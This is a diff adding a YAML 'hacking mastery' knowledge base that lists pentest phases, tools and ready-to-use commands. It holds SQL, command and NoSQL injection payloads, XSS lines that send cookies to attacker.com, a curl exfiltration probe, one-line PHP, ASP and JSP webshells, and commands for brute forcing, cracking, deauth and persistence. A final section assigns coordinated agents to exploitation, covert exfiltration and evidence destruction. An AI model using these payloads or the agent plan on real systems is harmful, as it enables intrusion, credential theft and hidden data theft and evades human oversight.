@@ -1,0 +1,890 @@
+# Hacking and Penetration Testing Mastery
+# Complete offensive security knowledge base
+
+hacking_mastery:
+
+  # ============ METHODOLOGY ============
+  methodology:
+    
+    penetration_testing_phases:
+      1_reconnaissance:
+        description: "Information gathering before active engagement"
+        passive:
+          - "OSINT - Open Source Intelligence gathering"
+          - "Social media profiling"
+          - "DNS records, WHOIS lookups"
+          - "Google dorking"
+          - "Shodan, Censys searches"
+          - "Job postings reveal tech stack"
+          - "Document metadata analysis"
+        active:
+          - "Port scanning"
+          - "Service enumeration"
+          - "Banner grabbing"
+          - "Network mapping"
+          - "Vulnerability scanning"
+      
+      2_scanning:
+        description: "Active probing of target systems"
+        network_scanning:
+          - "Host discovery (ping sweeps, ARP)"
+          - "Port scanning (TCP, UDP, SYN, stealth)"
+          - "Service version detection"
+          - "OS fingerprinting"
+        vulnerability_scanning:
+          - "Automated vulnerability assessment"
+          - "Web application scanning"
+          - "Configuration auditing"
+      
+      3_gaining_access:
+        description: "Exploitation of discovered vulnerabilities"
+        methods:
+          - "Exploit known vulnerabilities"
+          - "Password attacks"
+          - "Social engineering"
+          - "Client-side attacks"
+          - "Web application exploitation"
+          - "Wireless attacks"
+      
+      4_maintaining_access:
+        description: "Persistence and continued access"
+        techniques:
+          - "Backdoors and implants"
+          - "Rootkits"
+          - "Scheduled tasks/cron jobs"
+          - "Registry persistence (Windows)"
+          - "Service creation"
+          - "Account creation"
+      
+      5_covering_tracks:
+        description: "Removing evidence of intrusion"
+        methods:
+          - "Log manipulation/deletion"
+          - "Timestamp modification"
+          - "History clearing"
+          - "Traffic tunneling"
+          - "Anti-forensics techniques"
+
+  # ============ RECONNAISSANCE ============
+  reconnaissance:
+    
+    osint_techniques:
+      search_engines:
+        google_dorks:
+          description: "Advanced search operators to find sensitive data"
+          examples:
+            - 'site:target.com filetype:pdf'
+            - 'site:target.com inurl:admin'
+            - 'site:target.com intitle:"index of"'
+            - '"target.com" password filetype:log'
+            - 'site:target.com ext:sql | ext:db | ext:log'
+            - 'site:target.com intext:"sql syntax near"'
+            - 'site:pastebin.com "target.com"'
+        
+        shodan_queries:
+          description: "Search engine for internet-connected devices"
+          examples:
+            - 'hostname:target.com'
+            - 'org:"Target Corporation"'
+            - 'port:22 country:US'
+            - 'product:Apache city:"New York"'
+            - 'vuln:CVE-2021-44228'
+            - 'http.title:"Dashboard" country:US'
+      
+      social_media:
+        linkedin:
+          - "Employee enumeration"
+          - "Technology stack from job postings"
+          - "Organizational structure"
+          - "Email format discovery"
+        twitter_x:
+          - "Company announcements"
+          - "Employee complaints/leaks"
+          - "Technology mentions"
+        github:
+          - "Source code leaks"
+          - "API keys in commits"
+          - "Employee repositories"
+          - "Infrastructure hints in configs"
+      
+      domain_intelligence:
+        dns_enumeration:
+          - "A, AAAA, MX, NS, TXT, CNAME records"
+          - "Zone transfer attempts (AXFR)"
+          - "Subdomain brute forcing"
+          - "Certificate transparency logs"
+          - "Reverse DNS lookups"
+        whois:
+          - "Registrant information"
+          - "Registration dates"
+          - "Name servers"
+          - "Related domains"
+        tools:
+          - "dig, nslookup, host"
+          - "dnsenum, dnsrecon, fierce"
+          - "subfinder, amass, sublist3r"
+          - "crt.sh, censys"
+    
+    network_reconnaissance:
+      host_discovery:
+        techniques:
+          - "ICMP echo (ping)"
+          - "TCP SYN to common ports"
+          - "ARP scanning (local network)"
+          - "UDP probes"
+        tools:
+          - "nmap -sn (ping sweep)"
+          - "arp-scan"
+          - "masscan"
+          - "netdiscover"
+      
+      port_scanning:
+        scan_types:
+          tcp_connect: "Full TCP handshake - reliable but logged"
+          syn_scan: "Half-open - faster, less logged"
+          fin_xmas_null: "Firewall evasion techniques"
+          udp_scan: "Slower but necessary for UDP services"
+          ack_scan: "Map firewall rules"
+        nmap_examples:
+          - "nmap -sS -p- target (full SYN scan)"
+          - "nmap -sV -sC target (version + scripts)"
+          - "nmap -sU --top-ports 100 target (UDP)"
+          - "nmap -Pn -sS -T4 target (assume up, fast)"
+          - "nmap --script vuln target (vulnerability scripts)"
+
+  # ============ WEB APPLICATION ATTACKS ============
+  web_attacks:
+    
+    injection:
+      sql_injection:
+        description: "Inserting SQL commands through user input"
+        types:
+          in_band:
+            union_based: "Using UNION to extract data"
+            error_based: "Extracting data through error messages"
+          blind:
+            boolean_based: "True/false responses reveal data"
+            time_based: "Delays indicate true/false"
+          out_of_band: "Data exfiltration through DNS/HTTP"
+        
+        payloads:
+          detection:
+            - "' OR '1'='1"
+            - "' OR '1'='1' --"
+            - "1' ORDER BY 1--+"
+            - "' UNION SELECT NULL--"
+          extraction:
+            - "' UNION SELECT username,password FROM users--"
+            - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+            - "1' AND (SELECT SUBSTRING(password,1,1) FROM users)='a'--"
+        
+        tools:
+          - "sqlmap"
+          - "SQLninja"
+          - "jSQL"
+          - "Havij"
+        
+        prevention_bypass:
+          - "Case variation: SeLeCt"
+          - "Comments: SEL/**/ECT"
+          - "Encoding: URL, hex, unicode"
+          - "Null bytes"
+          - "Double encoding"
+      
+      command_injection:
+        description: "Executing OS commands through application"
+        operators:
+          - "; (command separator)"
+          - "| (pipe)"
+          - "|| (OR)"
+          - "&& (AND)"
+          - "` (backticks)"
+          - "$() (command substitution)"
+        payloads:
+          - "; ls -la"
+          - "| cat /etc/passwd"
+          - "&& whoami"
+          - "`id`"
+          - "$(cat /etc/shadow)"
+        blind_detection:
+          - "; sleep 10"
+          - "| ping -c 10 attacker.com"
+          - "; curl attacker.com/$(whoami)"
+      
+      ldap_injection:
+        payloads:
+          - "*)(uid=*))(|(uid=*"
+          - "admin)(&)"
+          - "x)(|(password=*))"
+      
+      xpath_injection:
+        payloads:
+          - "' or '1'='1"
+          - "' or ''='"
+          - "admin' or '1'='1"
+      
+      nosql_injection:
+        mongodb:
+          - '{"$gt": ""}'
+          - '{"$ne": ""}'
+          - '{"$regex": ".*"}'
+        payloads:
+          - "username[$ne]=x&password[$ne]=y"
+          - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    
+    xss:
+      description: "Cross-Site Scripting - injecting client-side scripts"
+      types:
+        reflected: "Payload in URL, reflected in response"
+        stored: "Payload stored in database, served to others"
+        dom_based: "Payload manipulates DOM directly"
+      
+      payloads:
+        basic:
+          - "<script>alert('XSS')</script>"
+          - "<img src=x onerror=alert('XSS')>"
+          - "<svg onload=alert('XSS')>"
+        filter_bypass:
+          - "<ScRiPt>alert('XSS')</sCrIpT>"
+          - "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>"
+          - "<body onload=alert('XSS')>"
+          - "javascript:alert('XSS')"
+          - "<iframe src='javascript:alert(1)'>"
+        advanced:
+          - "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
+          - "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"
+      
+      contexts:
+        html_context: "Direct HTML injection"
+        attribute_context: "Inside HTML attributes"
+        javascript_context: "Inside script blocks"
+        url_context: "In href or src attributes"
+    
+    authentication_attacks:
+      brute_force:
+        tools:
+          - "Hydra"
+          - "Burp Intruder"
+          - "Medusa"
+          - "Patator"
+        techniques:
+          - "Credential stuffing"
+          - "Password spraying"
+          - "Dictionary attacks"
+          - "Rule-based attacks"
+      
+      session_attacks:
+        session_hijacking: "Stealing session tokens"
+        session_fixation: "Forcing known session ID"
+        csrf: "Cross-site request forgery"
+      
+      jwt_attacks:
+        none_algorithm: "Change alg to none, remove signature"
+        key_confusion: "RS256 to HS256 with public key"
+        weak_secret: "Brute force HMAC secret"
+        kid_injection: "Inject path in key ID"
+    
+    file_attacks:
+      lfi:
+        description: "Local File Inclusion"
+        payloads:
+          - "../../../../etc/passwd"
+          - "....//....//....//etc/passwd"
+          - "/etc/passwd%00"
+          - "php://filter/convert.base64-encode/resource=config.php"
+        wrappers:
+          - "php://filter"
+          - "php://input"
+          - "data://"
+          - "expect://"
+      
+      rfi:
+        description: "Remote File Inclusion"
+        payloads:
+          - "http://attacker.com/shell.txt"
+          - "\\\\attacker.com\\share\\shell.php"
+      
+      file_upload:
+        bypass_techniques:
+          - "Double extension: shell.php.jpg"
+          - "Null byte: shell.php%00.jpg"
+          - "Content-type manipulation"
+          - "Magic bytes injection"
+          - "Case variation: shell.pHP"
+          - ".htaccess upload"
+        webshells:
+          php: "<?php system($_GET['cmd']); ?>"
+          asp: "<%eval request('cmd')%>"
+          jsp: "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>"
+    
+    ssrf:
+      description: "Server-Side Request Forgery"
+      targets:
+        - "Internal services (localhost, 127.0.0.1)"
+        - "Cloud metadata (169.254.169.254)"
+        - "Internal network hosts"
+      payloads:
+        - "http://127.0.0.1:22"
+        - "http://localhost/admin"
+        - "http://169.254.169.254/latest/meta-data/"
+        - "file:///etc/passwd"
+        - "gopher://127.0.0.1:6379/_INFO"
+      bypass:
+        - "Decimal IP: http://2130706433"
+        - "Hex IP: http://0x7f000001"
+        - "IPv6: http://[::1]"
+        - "DNS rebinding"
+        - "URL encoding"
+
+  # ============ NETWORK ATTACKS ============
+  network_attacks:
+    
+    man_in_the_middle:
+      arp_spoofing:
+        description: "Redirect traffic by poisoning ARP tables"
+        tools:
+          - "arpspoof"
+          - "ettercap"
+          - "bettercap"
+        command: "arpspoof -i eth0 -t victim_ip gateway_ip"
+      
+      dns_spoofing:
+        description: "Redirect DNS queries to attacker-controlled servers"
+        tools:
+          - "dnsspoof"
+          - "ettercap"
+          - "bettercap"
+      
+      ssl_stripping:
+        description: "Downgrade HTTPS to HTTP"
+        tools:
+          - "sslstrip"
+          - "bettercap"
+    
+    sniffing:
+      passive:
+        description: "Capture traffic on network"
+        tools:
+          - "Wireshark"
+          - "tcpdump"
+          - "tshark"
+        filters:
+          - "tcp port 80"
+          - "host 192.168.1.1"
+          - "tcp contains 'password'"
+      
+      active:
+        description: "Inject packets to capture more"
+        techniques:
+          - "MAC flooding"
+          - "DHCP starvation"
+          - "VLAN hopping"
+    
+    wireless:
+      wifi_attacks:
+        wep_cracking:
+          description: "Break WEP encryption"
+          tools: ["aircrack-ng", "wifite"]
+          method: "Capture IVs and crack key"
+        
+        wpa_wpa2_attacks:
+          handshake_capture:
+            tool: "airodump-ng"
+            method: "Capture 4-way handshake"
+          deauth_attack:
+            tool: "aireplay-ng"
+            command: "aireplay-ng -0 10 -a BSSID -c CLIENT wlan0"
+          cracking:
+            tools: ["aircrack-ng", "hashcat", "john"]
+            wordlist: "rockyou.txt"
+        
+        evil_twin:
+          description: "Create fake AP to capture credentials"
+          tools:
+            - "hostapd"
+            - "airbase-ng"
+            - "fluxion"
+            - "wifiphisher"
+        
+        wps_attacks:
+          description: "Attack WPS PIN"
+          tools: ["reaver", "bully"]
+          command: "reaver -i wlan0mon -b BSSID -vv"
+      
+      bluetooth:
+        bluejacking: "Send unsolicited messages"
+        bluesnarfing: "Steal data from device"
+        bluebugging: "Full device control"
+        tools:
+          - "hcitool"
+          - "btscanner"
+          - "bluesnarfer"
+
+  # ============ PASSWORD ATTACKS ============
+  password_attacks:
+    
+    online_attacks:
+      brute_force:
+        tools:
+          hydra:
+            ssh: "hydra -l user -P passwords.txt ssh://target"
+            ftp: "hydra -l user -P passwords.txt ftp://target"
+            http_form: "hydra -l admin -P pass.txt target http-post-form '/login:user=^USER^&pass=^PASS^:F=failed'"
+            rdp: "hydra -l admin -P pass.txt rdp://target"
+          
+          medusa:
+            ssh: "medusa -h target -u user -P passwords.txt -M ssh"
+          
+          ncrack:
+            ssh: "ncrack -p 22 --user root -P passwords.txt target"
+      
+      password_spraying:
+        description: "Try common passwords across many accounts"
+        technique: "Avoid lockouts by trying one password per account"
+        tools:
+          - "Spray"
+          - "Ruler"
+          - "MailSniper"
+    
+    offline_attacks:
+      hash_cracking:
+        hashcat:
+          description: "GPU-accelerated hash cracking"
+          modes:
+            0: "MD5"
+            100: "SHA1"
+            1000: "NTLM"
+            1800: "SHA512 Unix"
+            2500: "WPA/WPA2"
+            3200: "bcrypt"
+          attacks:
+            dictionary: "hashcat -m 0 hashes.txt wordlist.txt"
+            rules: "hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule"
+            mask: "hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a?a?a"
+            combinator: "hashcat -m 0 hashes.txt -a 1 dict1.txt dict2.txt"
+        
+        john:
+          description: "John the Ripper"
+          commands:
+            basic: "john --wordlist=rockyou.txt hashes.txt"
+            show: "john --show hashes.txt"
+            rules: "john --wordlist=rockyou.txt --rules hashes.txt"
+        
+        rainbow_tables:
+          description: "Precomputed hash chains"
+          tools: ["RainbowCrack", "ophcrack"]
+          limitation: "Defeated by salted hashes"
+      
+      hash_extraction:
+        windows:
+          sam_database: "Contains local account hashes"
+          tools:
+            - "mimikatz (sekurlsa::logonpasswords)"
+            - "secretsdump.py"
+            - "fgdump"
+            - "pwdump"
+          ntds_dit: "Domain controller hash database"
+        
+        linux:
+          shadow_file: "/etc/shadow"
+          extraction: "unshadow /etc/passwd /etc/shadow > combined.txt"
+
+  # ============ EXPLOITATION ============
+  exploitation:
+    
+    frameworks:
+      metasploit:
+        description: "Premier exploitation framework"
+        workflow:
+          - "msfconsole"
+          - "search exploit_name"
+          - "use exploit/path"
+          - "show options"
+          - "set RHOSTS target"
+          - "set PAYLOAD payload/path"
+          - "exploit"
+        
+        useful_modules:
+          exploit:
+            - "exploit/windows/smb/ms17_010_eternalblue"
+            - "exploit/multi/http/apache_mod_cgi_bash_env_exec"
+            - "exploit/unix/ftp/vsftpd_234_backdoor"
+          auxiliary:
+            - "auxiliary/scanner/portscan/tcp"
+            - "auxiliary/scanner/smb/smb_version"
+          post:
+            - "post/windows/gather/hashdump"
+            - "post/multi/recon/local_exploit_suggester"
+        
+        meterpreter:
+          description: "Advanced payload with extensive features"
+          commands:
+            - "sysinfo"
+            - "getuid"
+            - "getsystem"
+            - "hashdump"
+            - "download/upload"
+            - "shell"
+            - "migrate"
+            - "keyscan_start"
+            - "screenshot"
+            - "webcam_snap"
+      
+      cobalt_strike:
+        description: "Commercial adversary simulation"
+        features:
+          - "Beacon payload"
+          - "Malleable C2 profiles"
+          - "Team collaboration"
+          - "Post-exploitation"
+      
+      empire:
+        description: "PowerShell post-exploitation"
+        features:
+          - "PowerShell agents"
+          - "Python agents"
+          - "Extensive modules"
+    
+    privilege_escalation:
+      windows:
+        enumeration:
+          - "whoami /priv"
+          - "systeminfo"
+          - "net user"
+          - "net localgroup administrators"
+        tools:
+          - "winPEAS"
+          - "PowerUp"
+          - "BeRoot"
+          - "Sherlock"
+        techniques:
+          unquoted_service_paths: "Hijack service binaries"
+          dll_hijacking: "Replace DLLs in PATH"
+          always_install_elevated: "MSI privilege escalation"
+          token_impersonation: "Potato attacks"
+          credential_harvesting: "mimikatz, lazagne"
+      
+      linux:
+        enumeration:
+          - "id"
+          - "sudo -l"
+          - "cat /etc/passwd"
+          - "find / -perm -4000 2>/dev/null"
+        tools:
+          - "linPEAS"
+          - "LinEnum"
+          - "linux-exploit-suggester"
+          - "GTFOBins"
+        techniques:
+          suid_binaries: "Exploit SUID/SGID programs"
+          sudo_misconfig: "Exploitable sudo rules"
+          kernel_exploits: "Dirty COW, etc."
+          cron_jobs: "Hijack scheduled tasks"
+          writable_paths: "PATH hijacking"
+          capabilities: "Linux capabilities abuse"
+    
+    lateral_movement:
+      techniques:
+        pass_the_hash: "Use NTLM hash without cracking"
+        pass_the_ticket: "Use Kerberos tickets"
+        overpass_the_hash: "Request Kerberos ticket with NTLM"
+        psexec: "Remote execution via SMB"
+        wmi: "Windows Management Instrumentation"
+        winrm: "Windows Remote Management"
+        ssh_keys: "Stolen SSH private keys"
+        rdp: "Remote Desktop Protocol"
+      
+      tools:
+        - "psexec.py"
+        - "smbexec.py"
+        - "wmiexec.py"
+        - "evil-winrm"
+        - "CrackMapExec"
+        - "BloodHound"
+
+  # ============ SOCIAL ENGINEERING ============
+  social_engineering:
+    
+    phishing:
+      email:
+        types:
+          - "Credential harvesting"
+          - "Malware delivery"
+          - "Business email compromise"
+        tools:
+          - "Gophish"
+          - "King Phisher"
+          - "SET (Social Engineering Toolkit)"
+        techniques:
+          - "Typosquatting domains"
+          - "Lookalike domains"
+          - "Reply-to header manipulation"
+          - "HTML email with hidden links"
+      
+      spear_phishing:
+        description: "Targeted phishing using OSINT"
+        elements:
+          - "Personalization from LinkedIn/social media"
+          - "Reference to real projects/colleagues"
+          - "Urgency and authority"
+    
+    vishing:
+      description: "Voice phishing over phone"
+      techniques:
+        - "Pretexting (fake scenarios)"
+        - "Caller ID spoofing"
+        - "IVR system creation"
+    
+    pretexting:
+      common_scenarios:
+        - "IT support needing credentials"
+        - "Executive requesting wire transfer"
+        - "Vendor requiring account update"
+        - "HR with benefits questions"
+    
+    physical:
+      techniques:
+        - "Tailgating/piggybacking"
+        - "Badge cloning"
+        - "Dumpster diving"
+        - "USB drops"
+        - "Impersonation"
+
+  # ============ PERSISTENCE ============
+  persistence:
+    
+    windows:
+      registry:
+        - 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+        - 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+        - 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
+      scheduled_tasks:
+        command: "schtasks /create /tn name /tr payload /sc onlogon"
+      services:
+        command: "sc create servicename binpath= payload start= auto"
+      wmi_subscription:
+        description: "WMI event subscriptions for persistence"
+      dll_hijacking:
+        description: "Place malicious DLLs in search path"
+      startup_folder:
+        path: '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'
+    
+    linux:
+      cron:
+        command: "(crontab -l; echo '@reboot /path/to/payload') | crontab -"
+      bashrc_profile:
+        files:
+          - "~/.bashrc"
+          - "~/.bash_profile"
+          - "/etc/profile"
+      ssh_keys:
+        path: "~/.ssh/authorized_keys"
+      systemd:
+        description: "Create malicious service units"
+      ld_preload:
+        description: "Inject shared library"
+
+  # ============ EVASION ============
+  evasion:
+    
+    antivirus_bypass:
+      techniques:
+        - "Obfuscation"
+        - "Encryption/packing"
+        - "Polymorphism"
+        - "Living off the land (LOLBins)"
+        - "Fileless malware"
+        - "Memory-only execution"
+      tools:
+        - "Veil"
+        - "Shellter"
+        - "msfvenom with encoders"
+        - "Donut"
+    
+    firewall_evasion:
+      techniques:
+        - "Use allowed ports (80, 443)"
+        - "DNS tunneling"
+        - "ICMP tunneling"
+        - "Domain fronting"
+        - "Protocol encapsulation"
+    
+    ids_evasion:
+      techniques:
+        - "Fragmentation"
+        - "Encoding"
+        - "Low and slow scanning"
+        - "Encrypted channels"
+        - "Traffic blending"
+
+  # ============ TOOLS REFERENCE ============
+  tools:
+    
+    reconnaissance:
+      - name: "nmap"
+        purpose: "Port scanning and network discovery"
+      - name: "masscan"
+        purpose: "Fast port scanning"
+      - name: "Shodan"
+        purpose: "Internet-connected device search"
+      - name: "theHarvester"
+        purpose: "Email and subdomain enumeration"
+      - name: "Maltego"
+        purpose: "Visual link analysis"
+      - name: "Recon-ng"
+        purpose: "Web reconnaissance framework"
+    
+    web:
+      - name: "Burp Suite"
+        purpose: "Web application testing"
+      - name: "OWASP ZAP"
+        purpose: "Web vulnerability scanner"
+      - name: "sqlmap"
+        purpose: "SQL injection automation"
+      - name: "nikto"
+        purpose: "Web server scanner"
+      - name: "dirb/gobuster"
+        purpose: "Directory brute forcing"
+      - name: "wfuzz"
+        purpose: "Web fuzzing"
+    
+    exploitation:
+      - name: "Metasploit"
+        purpose: "Exploitation framework"
+      - name: "searchsploit"
+        purpose: "Exploit database search"
+      - name: "msfvenom"
+        purpose: "Payload generation"
+    
+    password:
+      - name: "Hashcat"
+        purpose: "GPU hash cracking"
+      - name: "John the Ripper"
+        purpose: "Password cracking"
+      - name: "Hydra"
+        purpose: "Online brute forcing"
+      - name: "CeWL"
+        purpose: "Custom wordlist generator"
+    
+    wireless:
+      - name: "aircrack-ng"
+        purpose: "WiFi auditing suite"
+      - name: "Kismet"
+        purpose: "Wireless network detector"
+      - name: "Wifite"
+        purpose: "Automated WiFi attacks"
+      - name: "Bettercap"
+        purpose: "Network attack framework"
+    
+    post_exploitation:
+      - name: "mimikatz"
+        purpose: "Windows credential extraction"
+      - name: "BloodHound"
+        purpose: "Active Directory analysis"
+      - name: "CrackMapExec"
+        purpose: "Network enumeration and exploitation"
+      - name: "Impacket"
+        purpose: "Network protocol toolkit"
+
+  # ============ AGENT COORDINATION ============
+  agent_coordination:
+    
+    distributed_operations:
+      description: "Coordinating multiple agents for complex operations"
+      
+      roles:
+        recon_agent:
+          purpose: "Passive and active reconnaissance"
+          tasks:
+            - "OSINT gathering"
+            - "Network mapping"
+            - "Service enumeration"
+            - "Vulnerability identification"
+        
+        exploit_agent:
+          purpose: "Exploitation and initial access"
+          tasks:
+            - "Exploit selection and execution"
+            - "Payload delivery"
+            - "Initial foothold establishment"
+        
+        persistence_agent:
+          purpose: "Maintaining access"
+          tasks:
+            - "Backdoor installation"
+            - "Scheduled task creation"
+            - "Multiple access points"
+        
+        exfil_agent:
+          purpose: "Data extraction"
+          tasks:
+            - "Data discovery"
+            - "Compression and encryption"
+            - "Covert exfiltration"
+        
+        lateral_agent:
+          purpose: "Internal network movement"
+          tasks:
+            - "Credential harvesting"
+            - "Privilege escalation"
+            - "Pivoting to new systems"
+        
+        cleanup_agent:
+          purpose: "Cover tracks"
+          tasks:
+            - "Log manipulation"
+            - "Artifact removal"
+            - "Evidence destruction"
+    
+    coordination_patterns:
+      sequential: "One agent triggers the next"
+      parallel: "Multiple agents work simultaneously"
+      hierarchical: "Lead agent coordinates sub-agents"
+      mesh: "Agents communicate peer-to-peer"
+    
+    communication:
+      c2_channels:
+        - "HTTP/HTTPS callbacks"
+        - "DNS tunneling"
+        - "Social media dead drops"
+        - "Legitimate cloud services"
+      protocol: "Encrypted, authenticated communications"
+      resilience: "Multiple fallback channels"
+
+  # ============ ATTACK SCENARIOS ============
+  scenarios:
+    
+    external_penetration:
+      phases:
+        - "OSINT and reconnaissance"
+        - "External vulnerability scanning"
+        - "Perimeter breach (phishing, exploit)"
+        - "Internal reconnaissance"
+        - "Privilege escalation"
+        - "Lateral movement"
+        - "Data exfiltration"
+    
+    internal_penetration:
+      phases:
+        - "Assume breach position"
+        - "Network enumeration"
+        - "Credential harvesting"
+        - "Domain escalation"
+        - "Critical asset access"
+    
+    red_team_operation:
+      characteristics:
+        - "Full scope engagement"
+        - "Multi-vector attacks"
+        - "Extended timeline"
+        - "Stealth prioritized"
+        - "Real-world adversary simulation"
+    
+    web_application_assessment:
+      methodology:
+        - "Mapping and enumeration"
+        - "Authentication testing"
+        - "Session management testing"
+        - "Input validation testing"
+        - "Business logic testing"
+        - "API testing"
